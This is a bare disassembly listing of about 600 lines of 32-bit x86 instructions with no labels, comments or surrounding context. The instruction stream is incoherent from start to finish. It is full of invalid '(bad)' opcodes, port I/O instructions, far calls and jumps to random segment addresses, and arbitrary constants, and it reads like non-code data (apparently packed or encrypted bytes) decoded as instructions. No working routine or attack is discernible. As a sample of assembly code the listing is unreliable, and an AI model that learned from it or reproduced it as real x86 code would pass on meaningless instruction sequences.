  40b148:	mov    ecx,0xee6c150
  40b14d:	push   edx
  40b14e:	xor    ch,BYTE PTR [ebx+esi*4-0x16be55af]
  40b155:	in     al,dx
  40b156:	and    DWORD PTR [edx-0x5a],0xffffff86
  40b15a:	ss (bad) 
  40b15c:	cmp    DWORD PTR [ecx+0xccddc53],eax
  40b162:	pop    ecx
  40b163:	mov    WORD PTR [edi+0x28],cs
  40b166:	inc    esp
  40b167:	popa   
  40b168:	int    0x6f
  40b16a:	mov    esp,0xe7dcc63d
  40b16f:	xlat   BYTE PTR ds:[ebx]
  40b170:	pop    ecx
  40b171:	mov    eax,0xf4c39ac5
  40b176:	jae    0x40b1cd
  40b178:	mov    ecx,0x955754ce
  40b17d:	pop    esp
  40b17e:	jmp    FWORD PTR [edi+0x6aabf659]
  40b184:	pusha  
  40b185:	adc    eax,0x2b6ed6ac
  40b18a:	mov    ds:0x8c33a65b,eax
  40b18f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b190:	push   esi
  40b191:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b192:	cmp    DWORD PTR [eax+0x1dc26b6e],ebp
  40b198:	popf   
  40b199:	cmp    al,0x66
  40b19b:	sbb    ch,BYTE PTR [ebx]
  40b19d:	aas    
  40b19e:	push   ebp
  40b19f:	or     esi,DWORD PTR [esi+0x43]
  40b1a2:	sbb    eax,0x1384266e
  40b1a7:	repz pop edx
  40b1a9:	mov    dl,0x8b
  40b1ab:	pop    ebx
  40b1ac:	out    0xd3,eax
  40b1ae:	or     BYTE PTR [edi-0x24],dl
  40b1b1:	xchg   edx,eax
  40b1b3:	aaa    
  40b1b4:	mov    bh,0xa7
  40b1b6:	ss int 0x7a
  40b1b9:	or     bh,BYTE PTR ds:0xde160951
  40b1bf:	pop    esi
  40b1c0:	sbb    DWORD PTR [eax-0x7f],esp
  40b1c3:	(bad)  
  40b1c4:	aad    0xc7
  40b1c6:	lahf   
  40b1c7:	pop    ecx
  40b1c8:	mov    dh,0x88
  40b1ca:	arpl   WORD PTR [ebp-0x20],ax
  40b1cd:	adc    DWORD PTR [ebx-0x2a1c7d08],esi
  40b1d3:	jo     0x40b1c7
  40b1d5:	or     BYTE PTR [esi],ah
  40b1d7:	jae    0x40b188
  40b1d9:	or     eax,0xe76320d7
  40b1de:	dec    ebx
  40b1df:	and    eax,0x21c91769
  40b1e4:	sbb    DWORD PTR [ebx],esp
  40b1e6:	xchg   ebx,eax
  40b1e7:	ins    DWORD PTR es:[edi],dx
  40b1e8:	or     al,BYTE PTR [eax+0x54b579a2]
  40b1ee:	adc    eax,0x78c1935c
  40b1f3:	jb     0x40b1bc
  40b1f5:	aas    
  40b1f6:	adc    al,0xa6
  40b1f8:	mov    BYTE PTR [edx+0x79],al
  40b1fb:	out    dx,al
  40b1fc:	rcr    BYTE PTR [edi-0x1427d4aa],0x75
  40b203:	mov    ch,0x49
  40b205:	mov    ds:0x52088731,eax
  40b20a:	mov    ebp,0x92a5cd75
  40b20f:	and    eax,0x15448bd8
  40b214:	icebp  
  40b215:	push   esi
  40b216:	mov    ecx,0x88af7502
  40b21b:	pop    ebx
  40b21c:	cmp    eax,0xe5606f88
  40b221:	sbb    al,0xf8
  40b223:	mov    ch,0xae
  40b225:	xchg   esi,eax
  40b226:	adc    BYTE PTR [edx+0x74f141e0],cl
  40b22c:	sub    cl,BYTE PTR [edi-0x12]
  40b22f:	push   ds
  40b230:	in     eax,dx
  40b231:	call   0x6067:0x3b97922d
  40b238:	fist   WORD PTR [ebx-0x23]
  40b23b:	in     al,0xb8
  40b23d:	mov    ds:0x836ed4f,eax
  40b242:	pop    es
  40b243:	mov    ah,0xb5
  40b245:	(bad)  
  40b246:	jnp    0x40b27e
  40b248:	mov    edx,0x78968b4a
  40b24d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b24e:	or     DWORD PTR [ecx+0x6cbd4d07],esp
  40b254:	sti    
  40b255:	push   edx
  40b256:	scas   al,BYTE PTR es:[edi]
  40b257:	push   cs
  40b258:	xchg   ecx,eax
  40b259:	adc    DWORD PTR [edx-0xd],0xffffff94
  40b25d:	rcr    DWORD PTR [ebx],1
  40b25f:	sahf   
  40b260:	ss or  ebx,edi
  40b263:	or     eax,0x46982421
  40b268:	jmp    0x40b2b0
  40b26a:	sbb    DWORD PTR [edx],edx
  40b26c:	jge    0x40b262
  40b26e:	sbb    eax,0xdd1541d5
  40b273:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b274:	or     BYTE PTR [edi-0x1437051],0x1d
  40b27b:	frstor [edi+0x325a8861]
  40b281:	sbb    eax,0x3dc5c77a
  40b286:	or     eax,0xe64c24e5
  40b28b:	ret    0x2f8
  40b28e:	add    al,0xe5
  40b290:	ja     0x40b2b3
  40b292:	or     BYTE PTR [ecx],ch
  40b294:	test   BYTE PTR [edi-0x53],ch
  40b297:	dec    ebx
  40b298:	bnd jae 0x40b29a
  40b29b:	aam    0x75
  40b29d:	and    DWORD PTR [esi+0x7b],esp
  40b2a0:	add    eax,0x2cf44305
  40b2a5:	mov    ebx,0x40b7828e
  40b2aa:	xchg   ebx,eax
  40b2ab:	jnp    0x40b238
  40b2ad:	(bad)  
  40b2ae:	iret   
  40b2af:	daa    
  40b2b0:	push   0xffffffef
  40b2b2:	jb     0x40b26c
  40b2b4:	cmp    ch,BYTE PTR [edi]
  40b2b6:	inc    esp
  40b2b7:	in     eax,0xc
  40b2b9:	ins    BYTE PTR es:[edi],dx
  40b2ba:	mov    dl,0xbb
  40b2bc:	mov    al,0x74
  40b2be:	cmp    eax,0x85c84438
  40b2c3:	bnd ret 
  40b2c5:	mov    edx,0xb12d9872
  40b2ca:	sar    DWORD PTR [ecx-0x323c15a8],cl
  40b2d0:	ror    ah,1
  40b2d2:	mov    ebx,0xfb4de8da
  40b2d7:	call   0x9131:0x39846eea
  40b2de:	mov    esp,0x3e4ccf79
  40b2e3:	div    DWORD PTR [edx+0x57]
  40b2e6:	loop   0x40b2ae
  40b2e8:	aam    0xb4
  40b2ea:	add    al,bh
  40b2ec:	call   0x54565894
  40b2f1:	xor    eax,0x7f2af769
  40b2f6:	lods   al,BYTE PTR ds:[esi]
  40b2f7:	push   ecx
  40b2f8:	loop   0x40b368
  40b2fa:	ffree  st(6)
  40b2fc:	xchg   ebp,eax
  40b2fd:	arpl   ax,sp
  40b2ff:	or     eax,0x6fac3074
  40b304:	addr16 cmp al,0xab
  40b307:	repz jg 0x40b2fc
  40b30a:	adc    BYTE PTR [ecx-0x5f0486ce],ah
  40b310:	xor    al,0x4a
  40b312:	daa    
  40b313:	mov    DWORD PTR ds:0x25162fe1,edx
  40b319:	mov    BYTE PTR [edx],cl
  40b31b:	es es dec edi
  40b31e:	dec    esp
  40b31f:	ss jp  0x40b347
  40b322:	push   es
  40b323:	popf   
  40b324:	push   0xbe1cdee9
  40b329:	ret    0xe940
  40b32c:	test   al,0xc2
  40b32e:	add    eax,esi
  40b330:	push   es
  40b331:	not    BYTE PTR [ecx+ebp*4+0x5c]
  40b335:	add    eax,0xc0147bc0
  40b33a:	push   esp
  40b33b:	mov    al,ds:0xcf986ace
  40b340:	xor    BYTE PTR [eax+0x5b],al
  40b343:	mov    bh,0xe6
  40b345:	ds mov edx,0x222cc471
  40b34b:	pop    ebp
  40b34c:	stos   BYTE PTR es:[edi],al
  40b34d:	mov    BYTE PTR [eax-0x61],0x41
  40b351:	sbb    edi,0x6d3f35f8
  40b357:	fisubr WORD PTR [esi]
  40b359:	dec    esp
  40b35a:	in     eax,dx
  40b35b:	mov    ds:0xb717a065,eax
  40b360:	arpl   bx,di
  40b362:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b363:	stc    
  40b364:	inc    ecx
  40b365:	push   ecx
  40b366:	cmp    DWORD PTR [edi],ebp
  40b368:	cmp    DWORD PTR [edi-0x54],0xffffff90
  40b36c:	push   es
  40b36d:	mov    eax,ds:0x472d58b7
  40b372:	in     al,0x50
  40b374:	add    bh,BYTE PTR [ebp-0x9ccdf5e]
  40b37a:	jmp    0xde781305
  40b37f:	pop    edi
  40b380:	in     al,dx
  40b381:	mov    esi,0x558ad1d8
  40b386:	adc    DWORD PTR [esi],edi
  40b388:	outs   dx,BYTE PTR ds:[esi]
  40b389:	mov    bh,dh
  40b38b:	cmp    edx,DWORD PTR [esi]
  40b38d:	test   bh,ch
  40b38f:	xor    ebp,DWORD PTR [ebp+0x3]
  40b392:	out    0x45,eax
  40b394:	es scas al,BYTE PTR es:[edi]
  40b396:	(bad)  
  40b398:	xchg   esi,eax
  40b399:	lock addr16 cmp al,0xca
  40b39d:	sar    DWORD PTR [ebp+0x9],1
  40b3a0:	cmc    
  40b3a1:	or     ecx,DWORD PTR [ecx-0x5f]
  40b3a4:	test   DWORD PTR [edx+eiz*2],esi
  40b3a7:	mov    ch,0x7e
  40b3a9:	pop    edi
  40b3aa:	sub    eax,0xad9c4a0d
  40b3af:	call   0xd6eb:0xf99fcc75
  40b3b6:	pop    edx
  40b3b7:	cmp    eax,0x4ea45a6c
  40b3bc:	outs   dx,BYTE PTR ds:[esi]
  40b3bd:	dec    esi
  40b3be:	adc    BYTE PTR [ebx],dl
  40b3c0:	stos   DWORD PTR es:[edi],eax
  40b3c1:	data16 mov ds:0xa1662542,al
  40b3c7:	outs   dx,BYTE PTR ds:[esi]
  40b3c8:	inc    esp
  40b3c9:	push   edi
  40b3ca:	aaa    
  40b3cb:	mov    ds:0x66ae95f3,eax
  40b3d0:	mov    cl,0xe1
  40b3d2:	ss out 0x84,al
  40b3d5:	(bad)  
  40b3d6:	fadd   QWORD PTR [ecx-0x69ad0724]
  40b3dc:	dec    edx
  40b3dd:	stos   DWORD PTR es:[edi],eax
  40b3de:	mov    al,ds:0xf7e52167
  40b3e3:	in     eax,0x17
  40b3e5:	sub    eax,0x34b3fc58
  40b3ea:	cwde   
  40b3eb:	(bad)  
  40b3ec:	sahf   
  40b3ed:	aad    0x3f
  40b3ef:	adc    ecx,DWORD PTR [edi-0x2b]
  40b3f2:	test   DWORD PTR [edx+0x3a],ebx
  40b3f5:	retf   
  40b3f6:	xchg   esp,eax
  40b3f7:	adc    al,0x20
  40b3f9:	xchg   BYTE PTR [ecx+0x4e6ac46c],ch
  40b3ff:	and    al,0xaa
  40b401:	push   0xe
  40b403:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b404:	cld    
  40b405:	xchg   edi,eax
  40b406:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b407:	mov    ds:0x6a0aad65,al
  40b40c:	lock sbb eax,0x199445ad
  40b412:	dec    BYTE PTR [ecx]
  40b414:	fstp   DWORD PTR [esi-0x2ea2d929]
  40b41a:	dec    ebx
  40b41b:	jbe    0x40b3a8
  40b41d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b41e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b41f:	pop    edx
  40b420:	pop    es
  40b421:	(bad)  
  40b422:	(bad)  
  40b423:	lods   eax,DWORD PTR ds:[esi]
  40b424:	ret    
  40b425:	stos   DWORD PTR es:[edi],eax
  40b426:	or     eax,0x20ba598
  40b42b:	push   ebx
  40b42c:	bound  ecx,QWORD PTR [edx-0x6fd88679]
  40b432:	sbb    cl,BYTE PTR [ebp-0x1d]
  40b435:	aaa    
  40b436:	jmp    0xb00fb113
  40b43b:	sbb    al,BYTE PTR [edi-0x37987972]
  40b441:	ins    DWORD PTR es:[edi],dx
  40b442:	mov    edx,0x1d2b406b
  40b447:	jne    0x40b4a8
  40b449:	sub    DWORD PTR [ecx],esp
  40b44b:	(bad)  
  40b44c:	mov    eax,0xc59c89b0
  40b451:	(bad)  
  40b452:	pop    edi
  40b453:	jno    0x40b3e0
  40b455:	push   eax
  40b456:	and    BYTE PTR [esi+0x3a159784],bl
  40b45c:	fucomip st,st(3)
  40b45e:	push   0x2045e1b7
  40b463:	iret   
  40b464:	mov    DWORD PTR [ebx+esi*8+0x314d0b1c],esp
  40b46b:	pop    ds
  40b46c:	repz push ebp
  40b46e:	frstor ds:0x9c8fbcd1
  40b474:	or     dl,BYTE PTR ds:0xf0dd5fe9
  40b47a:	aas    
  40b47b:	cld    
  40b47c:	in     al,dx
  40b47d:	fwait
  40b47e:	cwde   
  40b47f:	js     0x40b4cc
  40b481:	fdivr  st(2),st
  40b483:	sahf   
  40b484:	jle    0x40b418
  40b486:	neg    BYTE PTR [ebp-0x14]
  40b489:	dec    ecx
  40b48a:	inc    ebx
  40b48b:	lods   al,BYTE PTR ds:[esi]
  40b48c:	adc    al,0x96
  40b48e:	retf   
  40b48f:	stos   DWORD PTR es:[edi],eax
  40b490:	sbb    edi,DWORD PTR [ecx]
  40b492:	js     0x40b44e
  40b494:	cwde   
  40b495:	sub    ecx,ebx
  40b497:	ins    BYTE PTR es:[edi],dx
  40b498:	aaa    
  40b499:	loop   0x40b45d
  40b49b:	jmp    0x970a5d9d
  40b4a0:	cmp    BYTE PTR [ebp-0x249b7ff0],ah
  40b4a6:	xchg   ecx,eax
  40b4a7:	in     eax,dx
  40b4a8:	inc    edx
  40b4a9:	mov    DWORD PTR [edi+0x39],esp
  40b4ac:	pop    ss
  40b4ad:	je     0x40b502
  40b4af:	aad    0x5a
  40b4b1:	xchg   edx,eax
  40b4b2:	jmp    0x40b448
  40b4b4:	mov    bh,0x47
  40b4b6:	lea    esi,[ebx+0x20a07a54]
  40b4bc:	emms   
  40b4be:	xchg   esp,eax
  40b4bf:	xchg   esi,eax
  40b4c0:	push   edi
  40b4c1:	xor    cl,0x83
  40b4c4:	mov    cl,0x20
  40b4c6:	cmp    ebp,DWORD PTR [eax]
  40b4c8:	or     esi,DWORD PTR ds:0x3bc62dda
  40b4ce:	lea    eax,[ecx]
  40b4d0:	mov    ebp,esp
  40b4d2:	leave  
  40b4d3:	data16 add ah,BYTE PTR [esi+0xc]
  40b4d7:	adc    DWORD PTR [ecx-0x1c],0x7a
  40b4db:	imul   edx,ebx,0xffffffb0
  40b4de:	xchg   esp,eax
  40b4df:	pop    ebx
  40b4e0:	loope  0x40b4bb
  40b4e2:	push   esp
  40b4e3:	enter  0x797,0xa9
  40b4e7:	sar    BYTE PTR [esi-0x5f],1
  40b4ea:	inc    ebx
  40b4eb:	leave  
  40b4ec:	push   eax
  40b4ed:	(bad)  
  40b4ee:	loope  0x40b555
  40b4f0:	jge    0x40b482
  40b4f2:	fsubr  DWORD PTR [esi]
  40b4f4:	mov    eax,ds:0xd0f9831b
  40b4f9:	mov    eax,ds:0x1a197ca6
  40b4fe:	popf   
  40b4ff:	mov    edi,0x4bde094d
  40b504:	or     BYTE PTR [esi+edx*8],0xa9
  40b508:	and    BYTE PTR [eax+0x2],dl
  40b50b:	mov    ah,0x35
  40b50d:	xor    BYTE PTR cs:[edi],0xe
  40b511:	(bad)  
  40b512:	sahf   
  40b513:	push   cs
  40b514:	int    0xad
  40b516:	call   0xc4c1:0x85f94f56
  40b51d:	dec    ecx
  40b51e:	xor    al,0x22
  40b520:	call   0x243e:0x88a5c0af
  40b527:	mov    ebp,0x3eb0a402
  40b52c:	fstp   QWORD PTR [ecx+0x63]
  40b52f:	ror    BYTE PTR [edx+0x6],1
  40b532:	push   edi
  40b533:	ins    BYTE PTR es:[edi],dx
  40b534:	push   ecx
  40b535:	popa   
  40b536:	in     al,0x72
  40b538:	push   cs
  40b539:	push   0x28ca3241
  40b53e:	out    0x89,al
  40b540:	into   
  40b541:	inc    edi
  40b542:	dec    eax
  40b543:	xchg   ebx,eax
  40b544:	ja     0x40b585
  40b546:	push   0x74
  40b548:	or     al,0xcc
  40b54a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b54b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b54c:	les    edx,FWORD PTR [esi-0x26d9a97e]
  40b552:	dec    ebp
  40b553:	inc    edi
  40b554:	mov    ecx,0xae3e007e
  40b559:	pop    ecx
  40b55a:	mov    eax,0x9730bb12
  40b55f:	mov    BYTE PTR [ecx+0x5679569],dl
  40b565:	mov    WORD PTR [edx-0x6c734853],fs
  40b56b:	jge    0x40b5df
  40b56d:	(bad)  
  40b56e:	mul    BYTE PTR [esi+0x12]
  40b571:	or     bl,ch
  40b573:	push   cs
  40b574:	jne    0x40b567
  40b576:	xchg   edx,eax
  40b577:	loopne 0x40b59d
  40b579:	test   DWORD PTR [ecx+ebp*2+0x230692be],eax
  40b580:	es fs xchg esp,eax
  40b583:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b584:	popa   
  40b585:	adc    BYTE PTR ds:0x23d88e60,dl
  40b58b:	(bad)  
  40b58c:	mov    ah,0x13
  40b58e:	mov    bl,0x1e
  40b590:	rcr    edx,1
  40b592:	or     DWORD PTR ds:0x4978bf15,edx
  40b598:	inc    ebx
  40b599:	das    
  40b59a:	in     eax,dx
  40b59b:	mov    edi,0x2439d537
  40b5a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b5a1:	out    0x9f,al
  40b5a3:	mov    al,0xa1
  40b5a5:	test   bl,0x1f
  40b5a8:	js     0x40b546
  40b5aa:	and    eax,0x533737
  40b5af:	data16 int 0x88
  40b5b2:	add    esp,esi
  40b5b4:	sbb    ch,BYTE PTR [ebx+ebx*8]
  40b5b7:	imul   eax,DWORD PTR [ebx+0x4c4fd5a5],0x57d337a5
  40b5c1:	sahf   
  40b5c2:	adc    al,0x8a
  40b5c4:	dec    ebp
  40b5c5:	mov    esi,0x15d3d41
  40b5ca:	or     al,0x78
  40b5cc:	inc    ebp
  40b5cd:	pop    es
  40b5ce:	add    eax,0xa9150cf8
  40b5d3:	jne    0x40b55b
  40b5d5:	mov    DWORD PTR [edi-0x2],edi
  40b5d8:	or     DWORD PTR [ecx+0xe05650c],0xafd394d4
  40b5e2:	popw   ss
  40b5e4:	pop    ss
  40b5e5:	pop    esi
  40b5e6:	cmp    edi,esp
  40b5e8:	xchg   ebx,eax
  40b5e9:	aaa    
  40b5ea:	jmp    0x40b656
  40b5ec:	jmp    ebp
  40b5ee:	push   ecx
  40b5ef:	or     ah,dl
  40b5f1:	imul   eax,DWORD PTR [edx],0x7ab2fe85
  40b5f7:	neg    eax
  40b5f9:	pop    ebp
  40b5fa:	outs   dx,BYTE PTR ds:[esi]
  40b5fb:	jmp    0xa94e:0xf7cc5019
  40b602:	mov    esp,0xba761a56
  40b607:	mov    al,0xf0
  40b609:	pop    esi
  40b60a:	xchg   edi,eax
  40b60b:	inc    esp
  40b60c:	bswap  edi
  40b60e:	push   ebp
  40b60f:	push   ebp
  40b610:	dec    edi
  40b611:	fnstcw WORD PTR [esi-0x41ac3d53]
  40b617:	ins    BYTE PTR es:[edi],dx
  40b618:	(bad)  
  40b619:	in     eax,0x2a
  40b61b:	mov    ecx,0xac655147
  40b620:	or     eax,0xe94c01c3
  40b625:	ins    BYTE PTR es:[edi],dx
  40b626:	push   esi
  40b627:	xor    eax,0xbe4fa542
  40b62c:	(bad)  
  40b62e:	or     al,0x12
  40b630:	fidiv  WORD PTR [ecx]
  40b632:	xor    ah,BYTE PTR [ebx]
  40b634:	in     al,0x65
  40b636:	or     eax,0xb74c9b7e
  40b63b:	call   0x4642:0x3bd4635e
  40b642:	cmp    DWORD PTR ds:0x99824038,esp
  40b648:	gs je  0x40b5d4
  40b64b:	sub    BYTE PTR [ebx+0x35],0xdb
  40b64f:	push   cs
  40b650:	and    ebx,ebp
  40b652:	and    BYTE PTR [esi],bl
  40b654:	lods   eax,DWORD PTR ds:[esi]
  40b655:	sbb    DWORD PTR [esi-0x1b],esi
  40b658:	xchg   ch,ch
  40b65a:	int    0xe8
  40b65c:	cmp    BYTE PTR [edi-0x39b7f204],dl
  40b662:	mov    ds:0xa623b1f7,eax
  40b667:	stos   DWORD PTR es:[edi],eax
  40b668:	adc    dh,BYTE PTR [eax+0x2e339ac4]
  40b66e:	jmp    0x26e7:0x96b195d3
  40b675:	mov    ds:0x83f9e99d,al
  40b67a:	push   edx
  40b67b:	push   esp
  40b67c:	xor    BYTE PTR [ecx+eiz*2],dl
  40b67f:	mov    al,ds:0x50cdaf01
  40b684:	fcmovnb st,st(0)
  40b686:	das    
  40b687:	push   ebx
  40b688:	mov    ch,0x52
  40b68a:	int3   
  40b68b:	lods   al,BYTE PTR ds:[esi]
  40b68c:	sub    al,0x4b
  40b68e:	adc    bl,dl
  40b690:	les    ecx,FWORD PTR [ebp-0x3b]
  40b693:	mov    ebp,0x936074be
  40b698:	jp     0x40b6b5
  40b69a:	mov    ebx,ecx
  40b69c:	xchg   ecx,eax
  40b69d:	jbe    0x40b69d
  40b69f:	push   ecx
  40b6a0:	sti    
  40b6a1:	mul    DWORD PTR [ecx-0x4cb19eec]
  40b6a7:	call   0x6aab:0xfef9dfa8
  40b6ae:	cli    
  40b6af:	mov    esp,0xe6fda2cc
  40b6b4:	xchg   esi,eax
  40b6b5:	cmp    eax,0xc82e2ae8
  40b6ba:	push   0x20
  40b6bc:	pop    esi
  40b6bd:	lahf   
  40b6be:	adc    cl,0xd6
  40b6c1:	adc    al,0x5a
  40b6c3:	mov    cl,0xf5
  40b6c5:	push   edx
  40b6c6:	jl     0x40b73a
  40b6c8:	xor    edi,edi
  40b6ca:	mov    BYTE PTR [esi-0x43c94c20],dl
  40b6d0:	push   ecx
  40b6d1:	test   BYTE PTR [ebx],al
  40b6d3:	push   ss
  40b6d4:	mov    WORD PTR [edi],fs
  40b6d6:	mov    eax,ds:0x96118fe4
  40b6db:	cmp    BYTE PTR [edi+0x257d03c8],dl
  40b6e1:	popf   
  40b6e2:	jge    0x40b6e9
  40b6e4:	or     bh,dh
  40b6e6:	js     0x40b66f
  40b6e8:	pop    ecx
  40b6e9:	(bad)  
  40b6ea:	xor    eax,0x2d65d5e7
  40b6ef:	sub    al,0xb6
  40b6f1:	lock imul ebx,DWORD PTR [edx],0x33b98b48
  40b6f8:	pop    ecx
  40b6f9:	loope  0x40b701
  40b6fb:	and    DWORD PTR [ecx-0x50],ecx
  40b6fe:	fcmovnu st,st(0)
  40b700:	mov    WORD PTR [edi-0x3cecbbf5],?
  40b706:	push   esi
  40b707:	nop
  40b708:	mov    ds:0x981a0e4,al
  40b70d:	push   ss
  40b70e:	ins    DWORD PTR es:[edi],dx
  40b70f:	cmp    al,dh
  40b711:	(bad)  
  40b712:	mov    eax,ds:0x6a133fa8
  40b717:	into   
  40b718:	jne    0x40b72e
  40b71a:	inc    eax
  40b71b:	data16 stc 
  40b71d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b71e:	pop    ecx
  40b71f:	inc    eax
  40b720:	mov    edi,0x82ec366c
  40b725:	mov    ebp,0xcb8a7294
  40b72a:	inc    ebx
  40b72b:	sub    ebx,DWORD PTR [edi-0xc]
  40b72e:	xor    edi,DWORD PTR [esi+0x18]
  40b731:	(bad)  
  40b732:	mov    es,ebp
  40b734:	jns    0x40b79e
  40b736:	and    al,bl
  40b738:	or     eax,0xe0c492aa
  40b73d:	fwait
  40b73e:	dec    ecx
  40b73f:	popf   
  40b740:	shr    BYTE PTR [esi+0x21],0x1
  40b744:	adc    eax,DWORD PTR [ebp-0x7b]
  40b747:	cdq    
  40b748:	pushf  
  40b749:	lods   al,BYTE PTR ds:[esi]
  40b74a:	or     DWORD PTR [ecx+0x498fd4e5],edx
  40b750:	outs   dx,BYTE PTR fs:[esi]
  40b752:	ret    0x1efc
  40b755:	pop    es
  40b756:	jl     0x40b731
  40b758:	and    eax,DWORD PTR [eax-0x5f]
  40b75b:	nop
  40b75c:	adc    esp,DWORD PTR [ebp-0x3948fc64]
  40b762:	dec    ebx
  40b763:	mov    DWORD PTR [ecx-0x38c185e5],ebp
  40b769:	adc    DWORD PTR [edx],0xffffff9b
  40b76c:	leave  
  40b76d:	sub    bl,BYTE PTR [eax-0x5946a09b]
  40b773:	cmp    BYTE PTR [ecx+0x77],bl
  40b776:	nop
  40b777:	mov    eax,0x9396601d
  40b77c:	add    DWORD PTR [esi+0x2d],esi
  40b77f:	pop    esi
  40b780:	aam    0x4c
  40b782:	jb     0x40b7cf
  40b784:	mov    BYTE PTR [esi+0x1],cl
  40b787:	dec    ecx
  40b788:	stos   DWORD PTR es:[edi],eax
  40b789:	mov    es,edi
  40b78b:	xchg   edx,eax
  40b78c:	enter  0xc6ea,0x85
  40b790:	repz lds esi,FWORD PTR [ebx-0xa]
  40b794:	and    esp,DWORD PTR [ebp-0x59]
  40b797:	mov    dl,0xe9
  40b799:	push   esi
  40b79a:	aam    0x1b
  40b79c:	loope  0x40b769
  40b79e:	pusha  
  40b79f:	and    ah,ah
  40b7a1:	and    eax,0xfee5c49f
  40b7a6:	ins    DWORD PTR es:[edi],dx
  40b7a7:	ret    0x77c6
  40b7aa:	mov    ch,0x2c
  40b7ac:	shl    eax,1
  40b7ae:	sbb    eax,0x7e
  40b7b1:	mov    DWORD PTR [ebp+0x6f],ebx
  40b7b4:	les    ebp,FWORD PTR [ebx-0x41246a2e]
  40b7ba:	and    DWORD PTR [ecx],eax
  40b7bc:	jb     0x40b7a6
  40b7be:	imul   esi,DWORD PTR [edi-0x5fa5d184],0xffffffff
  40b7c5:	icebp  
  40b7c6:	dec    esi
  40b7c7:	mov    bl,0x90
  40b7c9:	cli    
  40b7ca:	mov    dl,0x82
  40b7cc:	xchg   esi,ebp
  40b7ce:	cmp    DWORD PTR [ebx+0x1f8c10b1],edi
  40b7d4:	stc    
  40b7d5:	fisub  DWORD PTR [ebx-0x5515a3dd]
  40b7db:	aas    
  40b7dc:	inc    edx
  40b7dd:	stc    
  40b7de:	fwait
  40b7df:	pop    edi
  40b7e0:	std    
  40b7e1:	scas   eax,DWORD PTR es:[edi]
  40b7e2:	push   eax
  40b7e3:	ins    BYTE PTR es:[edi],dx
  40b7e4:	sbb    al,0x54
  40b7e6:	xchg   esp,eax
  40b7e7:	push   ebp
  40b7e8:	sub    al,0x2b
  40b7ea:	scas   eax,DWORD PTR es:[edi]
  40b7eb:	inc    esp
  40b7ec:	mov    dh,0xe0
  40b7ee:	inc    ebp
  40b7ef:	lahf   
  40b7f0:	sub    bh,bh
  40b7f2:	xor    cl,ah
  40b7f4:	mov    DWORD PTR [ecx+0x77d755a9],0xa2597c11
  40b7fe:	mov    DWORD PTR [esi],0xb3d079a9
  40b804:	xchg   ecx,eax
  40b805:	adc    eax,0xb5973438
  40b80a:	jns    0x40b81b
  40b80c:	inc    ecx
  40b80d:	and    bh,BYTE PTR [eax+0x369de976]
  40b813:	jo     0x40b840
  40b815:	rol    DWORD PTR [ebp+0x4c2f129f],cl
  40b81b:	mov    ds,ecx
  40b81d:	mov    BYTE PTR [ecx],dl
  40b81f:	aam    0x31
  40b821:	mov    bh,0x62
  40b823:	push   es
  40b824:	repnz pop ecx
  40b826:	shr    DWORD PTR [ecx+0x68],cl
  40b829:	jne    0x40b82e
  40b82b:	pop    ebp
  40b82c:	stos   BYTE PTR es:[edi],al
  40b82d:	das    
  40b82e:	pop    ss
  40b82f:	xor    dl,BYTE PTR [ebx]
  40b831:	mov    ds:0x37106368,al
  40b836:	mov    dl,0x47
  40b838:	rol    DWORD PTR [edi-0x70a05c06],1
  40b83e:	in     al,dx
  40b83f:	retf   
  40b840:	cwde   
  40b841:	xchg   ebp,eax
  40b842:	repnz dec esp
  40b844:	popf   
  40b845:	nop
  40b846:	or     ecx,0xa12ad33e
  40b84c:	or     eax,0x5537bdb2
  40b851:	dec    esp
  40b852:	mov    ecx,0x32dcb5ff
  40b857:	hlt    
  40b858:	pusha  
  40b859:	pushf  
  40b85a:	fisubr DWORD PTR [ecx]
  40b85c:	jb     0x40b858
  40b85e:	stos   BYTE PTR es:[edi],al
  40b85f:	fmul   st,st(5)
  40b861:	(bad)  
  40b862:	sti    
  40b863:	inc    ebp
  40b864:	mov    edx,0x99c9e402
  40b869:	das    
  40b86a:	xchg   esi,eax
  40b86b:	dec    ebx
  40b86c:	xchg   bx,ax
  40b86e:	pop    ds
  40b86f:	mov    WORD PTR [esi+0x2594801f],ds
  40b875:	xchg   ebx,eax
  40b876:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b877:	jb     0x40b8d1
  40b879:	mov    bh,0xfd
  40b87b:	sbb    al,0xbf
  40b87d:	mov    eax,0xa4600af0
  40b882:	jmp    0x74dda07e
  40b887:	or     al,0xd
  40b889:	jle    0x40b84a
  40b88b:	rcr    BYTE PTR [esp+ebx*8],0xaa
  40b88f:	shl    ebp,0x85
  40b892:	hlt    
  40b893:	add    esi,edx
  40b895:	dec    ecx
  40b896:	jno    0x40b8e6
  40b898:	mov    ?,WORD PTR [edx]
  40b89a:	inc    esi
  40b89b:	xchg   edx,eax
  40b89c:	loope  0x40b867
  40b89e:	in     al,dx
  40b89f:	outs   dx,BYTE PTR ds:[esi]
  40b8a0:	test   eax,0x9d7ab120
  40b8a5:	std    
  40b8a6:	xor    eax,DWORD PTR [edx+0x109ce240]
  40b8ac:	jae    0x40b852
  40b8ae:	mov    edi,0x408ff9e7
  40b8b3:	xor    DWORD PTR [edx],ebp
  40b8b5:	sbb    al,BYTE PTR [esi-0x6bb26ee9]
  40b8bb:	sub    eax,0x7fe26d7d
  40b8c0:	scas   eax,DWORD PTR es:[edi]
  40b8c1:	mov    ecx,0x24308b13
  40b8c6:	mov    dh,0xfc
  40b8c8:	xchg   ebp,eax
  40b8c9:	and    ah,BYTE PTR gs:0xedec295c
  40b8d0:	rol    DWORD PTR [eax+0x5a980bd1],0xf3
  40b8d7:	dec    edi
  40b8d9:	repnz int 0xf6
  40b8dc:	xlat   BYTE PTR ds:[ebx]
